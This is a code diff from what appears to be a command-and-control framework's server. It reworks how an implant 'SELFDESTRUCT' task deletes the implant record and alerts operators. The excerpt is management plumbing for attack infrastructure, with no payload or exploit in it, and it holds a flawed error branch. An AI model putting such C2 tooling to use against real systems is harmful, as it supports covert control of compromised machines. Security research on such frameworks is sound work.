@@ -6,6 +6,7 @@ from maliketh.operator.rmq import send_message_to_all_queues, send_message_to_op
 from maliketh.models import *
 from functools import wraps
 from maliketh.config import C2_PROFILE
+from maliketh.opcodes import Opcodes
 from maliketh.crypto.ec import (
     generate_ecc_keypair,
     encrypt,
@@ -198,21 +199,24 @@ def get_task():
             load_privkey(get_implant_by_id(implant_id).server_sk),
             task.to_filtered_json().encode("utf-8"),
         )
+
+        if task.opcode == Opcodes.SELFDESTRUCT.value:
+            # Delete the implant
+            to_delete = get_implant_by_id(implant_id)
+            if to_delete is None:
+                encryptedResponse = encrypt(
+                    load_pubkey(get_implant_by_id(implant_id).implant_pk),
+                    load_privkey(get_implant_by_id(implant_id).server_sk),
+                    json.dumps({"status": False, "msg": "Unknown implant"}).encode("utf-8"),
+                ) 
+                return encryptedResponse, 400
+            db.session.delete(to_delete)
+            db.session.commit()
+            logger.error(f"Implant {implant_id} self-destructed")
+            send_message_to_all_queues(f"Implant {implant_id} self-destructed")
+
         return encryptedResponse
 
-    # If the task was a SELFDESTRUCT, delete the implant
-    if task is not None and task.command == "SELFDESTRUCT":
-        # Delete the implant
-        to_delete = Implant.query.filter_by(implant_id=implant_id).first()
-        if to_delete is None:
-            encryptedResponse = encrypt(
-                load_pubkey(get_implant_by_id(implant_id).implant_pk),
-                load_privkey(get_implant_by_id(implant_id).server_sk),
-                json.dumps({"status": False, "msg": "Unknown implant"}).encode("utf-8"),
-            ) 
-            return encryptedResponse, 400
-        db.session.delete(to_delete)
-        db.session.commit()
 
     # If task is None, return empty task
     encryptedResponse = encrypt(
